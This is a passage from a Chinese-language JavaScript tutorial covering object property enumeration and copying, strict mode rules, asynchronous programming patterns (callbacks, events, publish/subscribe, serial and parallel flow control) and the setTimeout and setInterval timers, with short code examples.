      }

   获得对象的所有属性（不管是自身的还是继承的，也不管是否可枚举），可以使用下面的函数。

   .. code:: javascript

      function inheritedPropertyNames(obj) {
        var props = {};
        while(obj) {
          Object.getOwnPropertyNames(obj).forEach(function(p) {
            props[p] = true;
          });
          obj = Object.getPrototypeOf(obj);
        }
        return Object.getOwnPropertyNames(props);
      }

   上面代码依次获取 ``obj`` 对象的每一级原型对象“自身”的属性，从而获取 ``obj`` 对象的“所有”属性，不管是否可遍历。

   下面是一个例子，列出 ``Date`` 对象的所有属性。

   .. code:: javascript

      inheritedPropertyNames(Date)
      // [
      //  "caller",
      //  "constructor",
      //  "toString",
      //  "UTC",
      //  ...
      // ]

对象的拷贝
--------

   如果要拷贝一个对象，需要做到下面两件事情。

   - 确保拷贝后的对象，与原对象具有同样的原型。
   - 确保拷贝后的对象，与原对象具有同样的实例属性。

   下面就是根据上面两点，实现的对象拷贝函数。

   .. code:: javascript

      function copyObject(orig) {
        var copy = Object.create(Object.getPrototypeOf(orig));
        copyOwnPropertiesFrom(copy, orig);
        return copy;
      }
   
      function copyOwnPropertiesFrom(target, source) {
        Object
          .getOwnPropertyNames(source)
          .forEach(function (propKey) {
            var desc = Object.getOwnPropertyDescriptor(source, propKey);
            Object.defineProperty(target, propKey, desc);
          });
        return target;
      }

   另一种更简单的写法，是利用 ES2017 才引入标准的 ``Object.getOwnPropertyDescriptors`` 方法。

   .. code:: javascript

      function copyObject(orig) {
        return Object.create(
          Object.getPrototypeOf(orig),
          Object.getOwnPropertyDescriptors(orig)
        );
      }

参考链接
-------

   - Dr. Axel Rauschmayer, [JavaScript properties: inheritance and enumerability](http://www.2ality.com/2011/07/js-properties.html)

/🟠 严格模式
===========

   除了正常的运行模式，JavaScript 还有第二种运行模式：严格模式（strict mode）。顾名思义，这种模式采用更加严格的 JavaScript 语法。

   同样的代码，在正常模式和严格模式中，可能会有不一样的运行结果。一些在正常模式下可以运行的语句，在严格模式下将不能运行。

设计目的
-------

   早期的 JavaScript 语言有很多设计不合理的地方，但是为了兼容以前的代码，又不能改变老的语法，只能不断添加新的语法，引导程序员使用新语法。

   严格模式是从 ES5 进入标准的，主要目的有以下几个。

   - 明确禁止一些不合理、不严谨的语法，减少 JavaScript 语言的一些怪异行为。
   - 增加更多报错的场合，消除代码运行的一些不安全之处，保证代码运行的安全。
   - 提高编译器效率，提升运行速度。
   - 为未来新版本的 JavaScript 语法做好铺垫。

   总之，严格模式体现了 JavaScript 更合理、更安全、更严谨的发展方向。

启用方法
-------

   进入严格模式的标志，是一行字符串 ``use strict`` 。

   .. code:: javascript

      'use strict';

   老版本的引擎会把它当作一行普通字符串，加以忽略。新版本的引擎就会进入严格模式。

   严格模式可以用于整个脚本，也可以只用于单个函数。

   **（1） 整个脚本文件**

    ``use strict`` 放在脚本文件的第一行，整个脚本都将以严格模式运行。如果这行语句不在第一行就无效，整个脚本会以正常模式运行。(严格地说，只要前面不是产生实际运行结果的语句， ``use strict`` 可以不在第一行，比如直接跟在一个空的分号后面，或者跟在注释后面。)

   .. code:: html

      <script>
        'use strict';
        console.log('这是严格模式');
      </script>
   
      <script>
        console.log('这是正常模式');
      </script>

   上面代码中，一个网页文件依次有两段 JavaScript 代码。前一个 ``<script>`` 标签是严格模式，后一个不是。

   如果 ``use strict`` 写成下面这样，则不起作用，严格模式必须从代码一开始就生效。

   .. code:: html

      <script>
        console.log('这是正常模式');
        'use strict';
      </script>

   **（2）单个函数**

    ``use strict`` 放在函数体的第一行，则整个函数以严格模式运行。

   .. code:: javascript

      function strict() {
        'use strict';
        return '这是严格模式';
      }
   
      function strict2() {
        'use strict';
        function f() {
          return '这也是严格模式';
        }
        return f();
      }
   
      function notStrict() {
        return '这是正常模式';
      }

   有时，需要把不同的脚本合并在一个文件里面。如果一个脚本是严格模式，另一个脚本不是，它们的合并就可能出错。严格模式的脚本在前，则合并后的脚本都是严格模式；如果正常模式的脚本在前，则合并后的脚本都是正常模式。这两种情况下，合并后的结果都是不正确的。这时可以考虑把整个脚本文件放在一个立即执行的匿名函数之中。

   .. code:: javascript

      (function () {
        'use strict';
        // some code here
      })();

显式报错
-------

   严格模式使得 JavaScript 的语法变得更严格，更多的操作会显式报错。其中有些操作，在正常模式下只会默默地失败，不会报错。

只读属性不可写
~~~~~~~~~~~~

   严格模式下，设置字符串的 ``length`` 属性，会报错。

   .. code:: javascript

      'use strict';
      'abc'.length = 5;
      // TypeError: Cannot assign to read only property 'length' of string 'abc'

   上面代码报错，因为 ``length`` 是只读属性，严格模式下不可写。正常模式下，改变 ``length`` 属性是无效的，但不会报错。

   严格模式下，对只读属性赋值，或者删除不可配置（non-configurable）属性都会报错。

   .. code:: javascript

      // 对只读属性赋值会报错
      'use strict';
      Object.defineProperty({}, 'a', {
        value: 37,
        writable: false
      });
      obj.a = 123;
      // TypeError: Cannot assign to read only property 'a' of object #<Object>
   
      // 删除不可配置的属性会报错
      'use strict';
      var obj = Object.defineProperty({}, 'p', {
        value: 1,
        configurable: false
      });
      delete obj.p
      // TypeError: Cannot delete property 'p' of #<Object>

只设置了取值器的属性不可写
~~~~~~~~~~~~~~~~~~~~~

   严格模式下，对一个只有取值器（getter）、没有存值器（setter）的属性赋值，会报错。

   .. code:: javascript

      'use strict';
      var obj = {
        get v() { return 1; }
      };
      obj.v = 2;
      // Uncaught TypeError: Cannot set property v of #<Object> which has only a getter

   上面代码中， ``obj.v`` 只有取值器，没有存值器，对它进行赋值就会报错。

禁止扩展的对象不可扩展
~~~~~~~~~~~~~~~~~~

   严格模式下，对禁止扩展的对象添加新属性，会报错。

   .. code:: javascript

      'use strict';
      var obj = {};
      Object.preventExtensions(obj);
      obj.v = 1;
      // Uncaught TypeError: Cannot add property v, object is not extensible

   上面代码中， ``obj`` 对象禁止扩展，添加属性就会报错。

eval、arguments 不可用作标识名
~~~~~~~~~~~~~~~~~~~~~~~~~~~

   严格模式下，使用 ``eval`` 或者 ``arguments`` 作为标识名，将会报错。下面的语句都会报错。

   .. code:: javascript

      'use strict';
      var eval = 17;
      var arguments = 17;
      var obj = { set p(arguments) { } };
      try { } catch (arguments) { }
      function x(eval) { }
      function arguments() { }
      var y = function eval() { };
      var f = new Function('arguments', "'use strict'; return 17;");
      // SyntaxError: Unexpected eval or arguments in strict mode

函数不能有重名的参数
~~~~~~~~~~~~~~~~

   正常模式下，如果函数有多个重名的参数，可以用 ``arguments[i]`` 读取。严格模式下，这属于语法错误。

   .. code:: javascript

      function f(a, a, b) {
        'use strict';
        return a + b;
      }
      // Uncaught SyntaxError: Duplicate parameter name not allowed in this context

禁止八进制的前缀0表示法
~~~~~~~~~~~~~~~~~~~

   正常模式下，整数的第一位如果是 ``0`` ，表示这是八进制数，比如 ``0100`` 等于十进制的64。严格模式禁止这种表示法，整数第一位为 ``0`` ，将报错。

   .. code:: javascript

      'use strict';
      var n = 0100;
      // Uncaught SyntaxError: Octal literals are not allowed in strict mode.

增强的安全措施
------------

   严格模式增强了安全保护，从语法上防止了一些不小心会出现的错误。

全局变量显式声明
~~~~~~~~~~~~~

   正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。

   .. code:: javascript

      'use strict';
   
      v = 1; // 报错，v未声明
   
      for (i = 0; i < 2; i++) { // 报错，i 未声明
        // ...
      }
   
      function f() {
        x = 123;
      }
      f() // 报错，未声明就创建一个全局变量

   因此，严格模式下，变量都必须先声明，然后再使用。

禁止 this 关键字指向全局对象
~~~~~~~~~~~~~~~~~~~~~~~~

   正常模式下，函数内部的 ``this`` 可能会指向全局对象，严格模式禁止这种用法，避免无意间创造全局变量。

   .. code:: javascript

      // 正常模式
      function f() {
        console.log(this === window);
      }
      f() // true
   
      // 严格模式
      function f() {
        'use strict';
        console.log(this === undefined);
      }
      f() // true

   上面代码中，严格模式的函数体内部 ``this`` 是 ``undefined`` 。

   这种限制对于构造函数尤其有用。使用构造函数时，有时忘了加 ``new`` ，这时 ``this`` 不再指向全局对象，而是报错。

   .. code:: javascript

      function f() {
        'use strict';
        this.a = 1;
      };
   
      f();// 报错，this 未定义

   严格模式下，函数直接调用时（不使用 ``new`` 调用），函数内部的 ``this`` 表示 ``undefined`` （未定义），因此可以用 ``call`` 、 ``apply`` 和 ``bind`` 方法，将任意值绑定在 ``this`` 上面。正常模式下， ``this`` 指向全局对象，如果绑定的值是非对象，将被自动转为对象再绑定上去，而 ``null`` 和 ``undefined`` 这两个无法转成对象的值，将被忽略。

   .. code:: javascript

      // 正常模式
      function fun() {
        return this;
      }
   
      fun() // window
      fun.call(2) // Number {2}
      fun.call(true) // Boolean {true}
      fun.call(null) // window
      fun.call(undefined) // window
   
      // 严格模式
      'use strict';
      function fun() {
        return this;
      }
   
      fun() //undefined
      fun.call(2) // 2
      fun.call(true) // true
      fun.call(null) // null
      fun.call(undefined) // undefined

   上面代码中，可以把任意类型的值，绑定在 ``this`` 上面。

禁止使用 fn.callee、fn.caller
~~~~~~~~~~~~~~~~~~~~~~~~~~~

   函数内部不得使用 ``fn.caller`` 、 ``fn.arguments`` ，否则会报错。这意味着不能在函数内部得到调用栈了。

   .. code:: javascript

      function f1() {
        'use strict';
        f1.caller;    // 报错
        f1.arguments; // 报错
      }
   
      f1();

禁止使用 arguments.callee、arguments.caller
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``arguments.callee`` 和 ``arguments.caller`` 是两个历史遗留的变量，从来没有标准化过，现在已经取消了。正常模式下调用它们没有什么作用，但是不会报错。严格模式明确规定，函数内部使用 ``arguments.callee`` 、 ``arguments.caller`` 将会报错。

   .. code:: javascript

      'use strict';
      var f = function () {
        return arguments.callee;
      };
   
      f(); // 报错

禁止删除变量
~~~~~~~~~~

   严格模式下无法删除变量，如果使用 ``delete`` 命令删除一个变量，会报错。只有对象的属性，且属性的描述对象的 ``configurable`` 属性设置为 ``true`` ，才能被 ``delete`` 命令删除。

   .. code:: javascript

      'use strict';
      var x;
      delete x; // 语法错误
   
      var obj = Object.create(null, {
        x: {
          value: 1,
          configurable: true
        }
      });
      delete obj.x; // 删除成功

静态绑定
-------

   JavaScript 语言的一个特点，就是允许“动态绑定”，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。

   严格模式对动态绑定做了一些限制。某些情况下，只允许静态绑定。也就是说，属性和方法到底归属哪个对象，必须在编译阶段就确定。这样做有利于编译效率的提高，也使得代码更容易阅读，更少出现意外。

   具体来说，涉及以下几个方面。

禁止使用 with 语句
~~~~~~~~~~~~~~~~

   严格模式下，使用 ``with`` 语句将报错。因为 ``with`` 语句无法在编译时就确定，某个属性到底归属哪个对象，从而影响了编译效果。

   .. code:: javascript

      'use strict';
      var v  = 1;
      var obj = {};
   
      with (obj) {
        v = 2;
      }
      // Uncaught SyntaxError: Strict mode code may not include a with statement

创设 eval 作用域
~~~~~~~~~~~~~~

   正常模式下，JavaScript 语言有两种变量作用域（scope）：全局作用域和函数作用域。严格模式创设了第三种作用域： ``eval`` 作用域。

   正常模式下， ``eval`` 语句的作用域，取决于它处于全局作用域，还是函数作用域。严格模式下， ``eval`` 语句本身就是一个作用域，不再能够在其所运行的作用域创设新的变量了，也就是说， ``eval`` 所生成的变量只能用于 ``eval`` 内部。

   .. code:: javascript

      (function () {
        'use strict';
        var x = 2;
        console.log(eval('var x = 5; x')) // 5
        console.log(x) // 2
      })()

   上面代码中，由于 ``eval`` 语句内部是一个独立作用域，所以内部的变量 ``x`` 不会泄露到外部。

   注意，如果希望 ``eval`` 语句也使用严格模式，有两种方式。

   .. code:: javascript

      // 方式一
      function f1(str){
        'use strict';
        return eval(str);
      }
      f1('undeclared_variable = 1'); // 报错
   
      // 方式二
      function f2(str){
        return eval(str);
      }
      f2('"use strict";undeclared_variable = 1')  // 报错

   上面两种写法， ``eval`` 内部使用的都是严格模式。

arguments 不再追踪参数的变化
~~~~~~~~~~~~~~~~~~~~~~~~~

   变量 ``arguments`` 代表函数的参数。严格模式下，函数内部改变参数与 ``arguments`` 的联系被切断了，两者不再存在联动关系。

   .. code:: javascript

      function f(a) {
        a = 2;
        return [a, arguments[0]];
      }
      f(1); // 正常模式为[2, 2]
   
      function f(a) {
        'use strict';
        a = 2;
        return [a, arguments[0]];
      }
      f(1); // 严格模式为[2, 1]

   上面代码中，改变函数的参数，不会反应到 ``arguments`` 对象上来。

向下一个版本的 JavaScript 过渡
---------------------------

   JavaScript 语言的下一个版本是 ECMAScript 6，为了平稳过渡，严格模式引入了一些 ES6 语法。

非函数代码块不得声明函数
~~~~~~~~~~~~~~~~~~~~

   ES6 会引入块级作用域。为了与新版本接轨，ES5 的严格模式只允许在全局作用域或函数作用域声明函数。也就是说，不允许在非函数的代码块内声明函数。

   .. code:: javascript

      'use strict';
      if (true) {
        function f1() { } // 语法错误
      }
   
      for (var i = 0; i < 5; i++) {
        function f2() { } // 语法错误
      }

   上面代码在 ``if`` 代码块和 ``for`` 代码块中声明了函数，ES5 环境会报错。

   注意，如果是 ES6 环境，上面的代码不会报错，因为 ES6 允许在代码块之中声明函数。

保留字
~~~~~

   为了向将来 JavaScript 的新版本过渡，严格模式新增了一些保留字（implements、interface、let、package、private、protected、public、static、yield等）。使用这些词作为变量名将会报错。

   .. code:: javascript

      function package(protected) { // 语法错误
        'use strict';
        var implements; // 语法错误
      }

参考链接
-------

   - MDN, [Strict mode](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Functions_and_function_scope/Strict_mode)
   - Dr. Axel Rauschmayer, [JavaScript: Why the hatred for strict mode?](http://www.2ality.com/2011/10/strict-mode-hatred.html)
   - Dr. Axel Rauschmayer，[JavaScript’s strict mode: a summary](http://www.2ality.com/2011/01/javascripts-strict-mode-summary.html)
   - Douglas Crockford, [Strict Mode Is Coming To Town](http://www.yuiblog.com/blog/2010/12/14/strict-mode-is-coming-to-town/)
   - [JavaScript Strict Mode Support](http://java-script.limewebs.com/strictMode/test_hosted.html)


/🟡7. 异步操作
================================================================================

/🟠 异步操作概述
==============


单线程模型
--------

   单线程模型指的是，JavaScript 只在一个线程上运行。也就是说，JavaScript 同时只能执行一个任务，其他任务都必须在后面排队等待。

   注意，JavaScript 只在一个线程上运行，不代表 JavaScript 引擎只有一个线程。事实上，JavaScript 引擎有多个线程，单个脚本只能在一个线程上运行（称为主线程），其他线程都是在后台配合。

   JavaScript 之所以采用单线程，而不是多线程，跟历史有关系。JavaScript 从诞生起就是单线程，原因是不想让浏览器变得太复杂，因为多线程需要共享资源、且有可能修改彼此的运行结果，对于一种网页脚本语言来说，这就太复杂了。如果 JavaScript 同时有两个线程，一个线程在网页 DOM 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？是不是还要有锁机制？所以，为了避免复杂性，JavaScript 一开始就是单线程，这已经成了这门语言的核心特征，将来也不会改变。

   这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段 JavaScript 代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。JavaScript 语言本身并不慢，慢的是读写外部数据，比如等待 Ajax 请求返回结果。这个时候，如果对方服务器迟迟没有响应，或者网络不通畅，就会导致脚本的长时间停滞。

   如果排队是因为计算量大，CPU 忙不过来，倒也算了，但是很多时候 CPU 是闲着的，因为 IO 操作（输入输出）很慢（比如 Ajax 操作从网络读取数据），不得不等着结果出来，再往下执行。JavaScript 语言的设计者意识到，这时 CPU 完全可以不管 IO 操作，挂起处于等待中的任务，先运行排在后面的任务。等到 IO 操作返回了结果，再回过头，把挂起的任务继续执行下去。这种机制就是 JavaScript 内部采用的“事件循环”机制（Event Loop）。

   单线程模型虽然对 JavaScript 构成了很大的限制，但也因此使它具备了其他语言不具备的优势。如果用得好，JavaScript 程序是不会出现堵塞的，这就是 Node.js 可以用很少的资源，应付大流量访问的原因。

   为了利用多核 CPU 的计算能力，HTML5 提出 Web Worker 标准，允许 JavaScript 脚本创建多个线程，但是子线程完全受主线程控制，且不得操作 DOM。所以，这个新标准并没有改变 JavaScript 单线程的本质。

同步任务和异步任务
---------------

   程序里面所有的任务，可以分成两类：同步任务（synchronous）和异步任务（asynchronous）。

   同步任务是那些没有被引擎挂起、在主线程上排队执行的任务。只有前一个任务执行完毕，才能执行后一个任务。

   异步任务是那些被引擎放在一边，不进入主线程、而进入任务队列的任务。只有引擎认为某个异步任务可以执行了（比如 Ajax 操作从服务器得到了结果），该任务（采用回调函数的形式）才会进入主线程执行。排在异步任务后面的代码，不用等待异步任务结束会马上运行，也就是说，异步任务不具有“堵塞”效应。

   举例来说，Ajax 操作可以当作同步任务处理，也可以当作异步任务处理，由开发者决定。如果是同步任务，主线程就等着 Ajax 操作返回结果，再往下执行；如果是异步任务，主线程在发出 Ajax 请求以后，就直接往下执行，等到 Ajax 操作有了结果，主线程再执行对应的回调函数。

任务队列和事件循环
---------------

   JavaScript 运行时，除了一个正在运行的主线程，引擎还提供一个任务队列（task queue），里面是各种需要当前程序处理的异步任务。（实际上，根据异步任务的类型，存在多个任务队列。为了方便理解，这里假设只存在一个队列。）

   首先，主线程会去执行所有的同步任务。等到同步任务全部执行完，就会去看任务队列里面的异步任务。如果满足条件，那么异步任务就重新进入主线程开始执行，这时它就变成同步任务了。等到执行完，下一个异步任务再进入主线程开始执行。一旦任务队列清空，程序就结束执行。

   异步任务的写法通常是回调函数。一旦异步任务重新进入主线程，就会执行对应的回调函数。如果一个异步任务没有回调函数，就不会进入任务队列，也就是说，不会重新进入主线程，因为没有用回调函数指定下一步的操作。

   JavaScript 引擎怎么知道异步任务有没有结果，能不能进入主线程呢？答案就是引擎在不停地检查，一遍又一遍，只要同步任务执行完了，引擎就会去检查那些挂起来的异步任务，是不是可以进入主线程了。这种循环检查的机制，就叫做事件循环（Event Loop）。[维基百科](http://en.wikipedia.org/wiki/Event_loop)的定义是：“事件循环是一个程序结构，用于等待和发送消息和事件（a programming construct that waits for and dispatches events or messages in a program）”。

异步操作的模式
------------

   下面总结一下异步操作的几种模式。

回调函数
~~~~~~~

   回调函数是异步操作最基本的方法。

   下面是两个函数 ``f1`` 和 ``f2`` ，编程的意图是 ``f2`` 必须等到 ``f1`` 执行完成，才能执行。

   .. code:: javascript

      function f1() {
        // ...
      }
   
      function f2() {
        // ...
      }
   
      f1();
      f2();

   上面代码的问题在于，如果 ``f1`` 是异步操作， ``f2`` 会立即执行，不会等到 ``f1`` 结束再执行。

   这时，可以考虑改写 ``f1`` ，把 ``f2`` 写成 ``f1`` 的回调函数。

   .. code:: javascript

      function f1(callback) {
        // ...
        callback();
      }
   
      function f2() {
        // ...
      }
   
      f1(f2);

   回调函数的优点是简单、容易理解和实现，缺点是不利于代码的阅读和维护，各个部分之间高度[耦合](http://en.wikipedia.org/wiki/Coupling_(computer_programming))（coupling），使得程序结构混乱、流程难以追踪（尤其是多个回调函数嵌套的情况），而且每个任务只能指定一个回调函数。

事件监听
~~~~~~~

   另一种思路是采用事件驱动模式。异步任务的执行不取决于代码的顺序，而取决于某个事件是否发生。

   还是以 ``f1`` 和 ``f2`` 为例。首先，为 ``f1`` 绑定一个事件（这里采用的 jQuery 的[写法](http://api.jquery.com/on/)）。

   .. code:: javascript

      f1.on('done', f2);

   上面这行代码的意思是，当 ``f1`` 发生 ``done`` 事件，就执行 ``f2`` 。然后，对 ``f1`` 进行改写：

   .. code:: javascript

      function f1() {
        setTimeout(function () {
          // ...
          f1.trigger('done');
        }, 1000);
      }

   上面代码中， ``f1.trigger('done')`` 表示，执行完成后，立即触发 ``done`` 事件，从而开始执行 ``f2`` 。

   这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以“[去耦合](http://en.wikipedia.org/wiki/Decoupling)”（decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。阅读代码的时候，很难看出主流程。

发布/订阅
~~~~~~~~

   事件完全可以理解成“信号”，如果存在一个“信号中心”，某个任务执行完成，就向信号中心“发布”（publish）一个信号，其他任务可以向信号中心“订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”[发布/订阅模式](http://en.wikipedia.org/wiki/Publish-subscribe_pattern)”（publish-subscribe pattern），又称“[观察者模式](http://en.wikipedia.org/wiki/Observer_pattern)”（observer pattern）。

   这个模式有多种[实现](http://msdn.microsoft.com/en-us/magazine/hh201955.aspx)，下面采用的是 Ben Alman 的 [Tiny Pub/Sub](https://gist.github.com/661855)，这是 jQuery 的一个插件。

   首先， ``f2`` 向信号中心 ``jQuery`` 订阅 ``done`` 信号。

   .. code:: javascript

      jQuery.subscribe('done', f2);

   然后， ``f1`` 进行如下改写。

   .. code:: javascript

      function f1() {
        setTimeout(function () {
          // ...
          jQuery.publish('done');
        }, 1000);
      }

   上面代码中， ``jQuery.publish('done')`` 的意思是， ``f1`` 执行完成后，向信号中心 ``jQuery`` 发布 ``done`` 信号，从而引发 ``f2`` 的执行。

    ``f2`` 完成执行后，可以取消订阅（unsubscribe）。

   .. code:: javascript

      jQuery.unsubscribe('done', f2);

   这种方法的性质与“事件监听”类似，但是明显优于后者。因为可以通过查看“消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。

异步操作的流程控制
---------------

   如果有多个异步操作，就存在一个流程控制的问题：如何确定异步操作执行的顺序，以及如何保证遵守这种顺序。

   .. code:: javascript

      function async(arg, callback) {
        console.log('参数为 ' + arg +' , 1秒后返回结果');
        setTimeout(function () { callback(arg * 2); }, 1000);
      }

   上面代码的 ``async`` 函数是一个异步任务，非常耗时，每次执行需要1秒才能完成，然后再调用回调函数。

   如果有六个这样的异步任务，需要全部完成后，才能执行最后的 ``final`` 函数。请问应该如何安排操作流程？

   .. code:: javascript

      function final(value) {
        console.log('完成: ', value);
      }
   
      async(1, function (value) {
        async(2, function (value) {
          async(3, function (value) {
            async(4, function (value) {
              async(5, function (value) {
                async(6, final);
              });
            });
          });
        });
      });
      // 参数为 1 , 1秒后返回结果
      // 参数为 2 , 1秒后返回结果
      // 参数为 3 , 1秒后返回结果
      // 参数为 4 , 1秒后返回结果
      // 参数为 5 , 1秒后返回结果
      // 参数为 6 , 1秒后返回结果
      // 完成:  12

   上面代码中，六个回调函数的嵌套，不仅写起来麻烦，容易出错，而且难以维护。

串行执行
~~~~~~~

   我们可以编写一个流程控制函数，让它来控制异步任务，一个任务完成以后，再执行另一个。这就叫串行执行。

   .. code:: javascript

      var items = [ 1, 2, 3, 4, 5, 6 ];
      var results = [];
   
      function async(arg, callback) {
        console.log('参数为 ' + arg +' , 1秒后返回结果');
        setTimeout(function () { callback(arg * 2); }, 1000);
      }
   
      function final(value) {
        console.log('完成: ', value);
      }
   
      function series(item) {
        if(item) {
          async( item, function(result) {
            results.push(result);
            return series(items.shift());
          });
        } else {
          return final(results[results.length - 1]);
        }
      }
   
      series(items.shift());

   上面代码中，函数 ``series`` 就是串行函数，它会依次执行异步任务，所有任务都完成后，才会执行 ``final`` 函数。 ``items`` 数组保存每一个异步任务的参数， ``results`` 数组保存每一个异步任务的运行结果。

   注意，上面的写法需要六秒，才能完成整个脚本。

并行执行
~~~~~~~

   流程控制函数也可以是并行执行，即所有异步任务同时执行，等到全部完成以后，才执行 ``final`` 函数。

   .. code:: javascript

      var items = [ 1, 2, 3, 4, 5, 6 ];
      var results = [];
   
      function async(arg, callback) {
        console.log('参数为 ' + arg +' , 1秒后返回结果');
        setTimeout(function () { callback(arg * 2); }, 1000);
      }
   
      function final(value) {
        console.log('完成: ', value);
      }
   
      items.forEach(function(item) {
        async(item, function(result){
          results.push(result);
          if(results.length === items.length) {
            final(results[results.length - 1]);
          }
        })
      });

   上面代码中， ``forEach`` 方法会同时发起六个异步任务，等到它们全部完成以后，才会执行 ``final`` 函数。

   相比而言，上面的写法只要一秒，就能完成整个脚本。这就是说，并行执行的效率较高，比起串行执行一次只能执行一个任务，较为节约时间。但是问题在于如果并行的任务较多，很容易耗尽系统资源，拖慢运行速度。因此有了第三种流程控制方式。

并行与串行的结合
~~~~~~~~~~~~~

   所谓并行与串行的结合，就是设置一个门槛，每次最多只能并行执行 ``n`` 个异步任务，这样就避免了过分占用系统资源。

   .. code:: javascript

      var items = [ 1, 2, 3, 4, 5, 6 ];
      var results = [];
      var running = 0;
      var limit = 2;
   
      function async(arg, callback) {
        console.log('参数为 ' + arg +' , 1秒后返回结果');
        setTimeout(function () { callback(arg * 2); }, 1000);
      }
   
      function final(value) {
        console.log('完成: ', value);
      }
   
      function launcher() {
        while(running < limit && items.length > 0) {
          var item = items.shift();
          async(item, function(result) {
            results.push(result);
            running--;
            if(items.length > 0) {
              launcher();
            } else if(running === 0) {
              final(results);
            }
          });
          running++;
        }
      }
   
      launcher();

   上面代码中，最多只能同时运行两个异步任务。变量 ``running`` 记录当前正在运行的任务数，只要低于门槛值，就再启动一个新的任务，如果等于 ``0`` ，就表示所有任务都执行完了，这时就执行 ``final`` 函数。

   这段代码需要三秒完成整个脚本，处在串行执行和并行执行之间。通过调节 ``limit`` 变量，达到效率和资源的最佳平衡。

/🟠 定时器
=========

   JavaScript 提供定时执行代码的功能，叫做定时器（timer），主要由 ``setTimeout()`` 和 ``setInterval()`` 这两个函数来完成。它们向任务队列添加定时任务。

setTimeout()
-------------

    ``setTimeout`` 函数用来指定某个函数或某段代码，在多少毫秒之后执行。它返回一个整数，表示定时器的编号，以后可以用来取消这个定时器。

   .. code:: javascript

      var timerId = setTimeout(func|code, delay);

   上面代码中， ``setTimeout`` 函数接受两个参数，第一个参数 ``func|code`` 是将要推迟执行的函数名或者一段代码，第二个参数 ``delay`` 是推迟执行的毫秒数。

   .. code:: javascript

      console.log(1);
      setTimeout('console.log(2)',1000);
      console.log(3);
      // 1
      // 3
      // 2

   上面代码会先输出1和3，然后等待1000毫秒再输出2。注意， ``console.log(2)`` 必须以字符串的形式，作为 ``setTimeout`` 的参数。

   如果推迟执行的是函数，就直接将函数名，作为 ``setTimeout`` 的参数。

   .. code:: javascript

      function f() {
        console.log(2);
      }
   
      setTimeout(f, 1000);

    ``setTimeout`` 的第二个参数如果省略，则默认为0。

   .. code:: javascript

      setTimeout(f)
      // 等同于
      setTimeout(f, 0)

   除了前两个参数， ``setTimeout`` 还允许更多的参数。它们将依次传入推迟执行的函数（回调函数）。

   .. code:: javascript

      setTimeout(function (a,b) {
        console.log(a + b);
      }, 1000, 1, 1);

   上面代码中， ``setTimeout`` 共有4个参数。最后那两个参数，将在1000毫秒之后回调函数执行时，作为回调函数的参数。

   还有一个需要注意的地方，如果回调函数是对象的方法，那么 ``setTimeout`` 使得方法内部的 ``this`` 关键字指向全局环境，而不是定义时所在的那个对象。

   .. code:: javascript

      var x = 1;
   
      var obj = {
        x: 2,
        y: function () {
          console.log(this.x);
        }
      };
   
      setTimeout(obj.y, 1000) // 1

   上面代码输出的是1，而不是2。因为当 ``obj.y`` 在1000毫秒后运行时， ``this`` 所指向的已经不是 ``obj`` 了，而是全局环境。

   为了防止出现这个问题，一种解决方法是将 ``obj.y`` 放入一个函数。

   .. code:: javascript

      var x = 1;
   
      var obj = {
        x: 2,
        y: function () {
          console.log(this.x);
        }
      };
   
      setTimeout(function () {
        obj.y();
      }, 1000);
      // 2

   上面代码中， ``obj.y`` 放在一个匿名函数之中，这使得 ``obj.y`` 在 ``obj`` 的作用域执行，而不是在全局作用域内执行，所以能够显示正确的值。

   另一种解决方法是，使用 ``bind`` 方法，将 ``obj.y`` 这个方法绑定在 ``obj`` 上面。

   .. code:: javascript

      var x = 1;
   
      var obj = {
        x: 2,
        y: function () {
          console.log(this.x);
        }
      };
   
      setTimeout(obj.y.bind(obj), 1000)
      // 2

setInterval()
--------------

    ``setInterval`` 函数的用法与 ``setTimeout`` 完全一致，区别仅仅在于 ``setInterval`` 指定某个任务每隔一段时间就执行一次，也就是无限次的定时执行。

   .. code:: javascript

      var i = 1
      var timer = setInterval(function() {
        console.log(2);
      }, 1000)

   上面代码中，每隔1000毫秒就输出一个2，会无限运行下去，直到关闭当前窗口。

   与 ``setTimeout`` 一样，除了前两个参数， ``setInterval`` 方法还可以接受更多的参数，它们会传入回调函数。

   下面是一个通过 ``setInterval`` 方法实现网页动画的例子。

   .. code:: javascript

      var div = document.getElementById('someDiv');
      var opacity = 1;
      var fader = setInterval(function() {
        opacity -= 0.1;
        if (opacity >= 0) {
          div.style.opacity = opacity;
        } else {
          clearInterval(fader);
        }
      }, 100);

   上面代码每隔100毫秒，设置一次 ``div`` 元素的透明度，直至其完全透明为止。

    ``setInterval`` 的一个常见用途是实现轮询。下面是一个轮询 URL 的 Hash 值是否发生变化的例子。

   .. code:: javascript

      var hash = window.location.hash;
      var hashWatcher = setInterval(function() {
        if (window.location.hash != hash) {
          updatePage();
        }
      }, 1000);

    ``setInterval`` 指定的是“开始执行”之间的间隔，并不考虑每次任务执行本身所消耗的时间。因此实际上，两次执行之间的间隔会小于指定的时间。比如， ``setInterval`` 指定每 100ms 执行一次，每次执行需要 5ms，那么第一次执行结束后95毫秒，第二次执行就会开始。如果某次执行耗时特别长，比如需要105毫秒，那么它结束后，下一次执行就会立即开始。

   为了确保两次执行之间有固定的间隔，可以不用 ``setInterval`` ，而是每次执行结束后，使用 ``setTimeout`` 指定下一次执行的具体时间。

   .. code:: javascript

      var i = 1;
      var timer = setTimeout(function f() {
        // ...
        timer = setTimeout(f, 2000);
      }, 2000);

   上面代码可以确保，下一次执行总是在本次执行结束之后的2000毫秒开始。

clearTimeout()，clearInterval()
--------------------------------

